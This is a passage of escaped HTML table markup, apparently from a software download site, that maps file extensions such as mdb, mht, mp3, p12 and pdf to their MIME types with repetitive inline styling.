BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/octet-stream</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">lsf</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">video/x-la-asf</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">lsx</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">video/x-la-asf</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">lzh</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/octet-stream</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">m13</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-msmediaview</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">m14</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-msmediaview</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">m3u</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">audio/x-mpegurl</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">man</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-troff-man</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">mdb</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-msaccess</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">me</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-troff-me</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">mht</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">message/rfc822</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">mhtml</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">message/rfc822</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">mid</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">audio/mid</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">mny</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-msmoney</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">mov</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">video/<a href=\\"http://www.cr173.com/k/Quicktime/\\" target=\\"_blank\\">Quicktime</a></td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">movie</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">video/x-sgi-movie</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">mp2</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">video/mpeg</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">mp3</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">audio/mpeg</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">mpa</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">video/mpeg</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">mpe</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">video/mpeg</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">mpeg</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">video/mpeg</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">mpg</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">video/mpeg</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">mpp</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/vnd.ms-project</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">mpv2</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">video/mpeg</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">ms</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-troff-ms</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">mvb</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-msmediaview</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">nws</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">message/rfc822</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">oda</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/oda</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">p10</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/pkcs10</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">p12</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-pkcs12</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">p7b</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-pkcs7-certificates</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">p7c</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-pkcs7-mime</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">p7m</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-pkcs7-mime</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">p7r</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-pkcs7-certreqresp</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">p7s</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-pkcs7-signature</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">pbm</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">image/x-portable-bitmap</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">pdf</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; 